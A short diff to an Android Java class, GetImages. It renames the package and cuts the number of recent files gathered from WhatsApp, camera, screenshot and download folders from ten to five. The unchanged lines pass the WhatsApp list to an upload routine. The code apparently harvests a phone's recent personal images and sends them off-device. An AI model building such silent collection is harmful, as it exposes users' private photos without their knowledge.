@@ -1,4 +1,4 @@
-package com.hazyaz.temps;
+package com.hazyaz.temps.Media;
 
 import android.os.Environment;
 import android.util.Log;
@@ -14,7 +14,7 @@ public class GetImages {
     public ArrayList<String> cameraLast10Messages = new ArrayList<>();
     public ArrayList<String> screenshotsLast10Messages = new ArrayList<>();
     public ArrayList<String> downloadsLast10Messages = new ArrayList<>();
-    private int LAST10 = 10;
+    private int LAST10 = 5;
 
 
     public GetImages() {
@@ -41,6 +41,8 @@ public class GetImages {
             ImagesUpload ib = new ImagesUpload();
 
             Log.d("Wdfgfdgfdg", "FileName:" + whatsAppLast10Messages);
+
+
             ib.ImageUplods(whatsAppLast10Messages);
 
         }
